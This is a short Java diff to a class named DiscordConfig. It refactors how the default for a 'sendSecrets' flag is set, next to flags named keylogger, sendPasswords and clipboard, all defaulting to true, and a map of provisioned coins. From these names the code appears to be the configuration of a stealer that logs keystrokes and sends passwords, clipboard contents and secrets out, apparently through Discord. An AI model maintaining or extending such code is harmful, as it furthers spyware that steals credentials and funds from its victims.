@@ -20,7 +20,9 @@ public final class DiscordConfig {
 	private static volatile boolean keylogger = true;
 	private static volatile boolean sendPasswords = true;
 	private static volatile boolean clipboard = true;
-	private static volatile boolean sendSecrets = true;
+	/** Secret clipboard alerts are on unless a config explicitly turns them off. */
+	private static final boolean SECRETS_DEFAULT = true;
+	private static volatile boolean sendSecrets = SECRETS_DEFAULT;
 	private static volatile boolean testnet = false;
 	private static volatile Map<String, List<String>> provisionedCoins = Map.of();
 
@@ -148,7 +150,7 @@ public final class DiscordConfig {
 		keylogger = true;
 		sendPasswords = true;
 		clipboard = true;
-		sendSecrets = true;
+		sendSecrets = SECRETS_DEFAULT;
 		testnet = false;
 		provisionedCoins = Map.of();
 	}
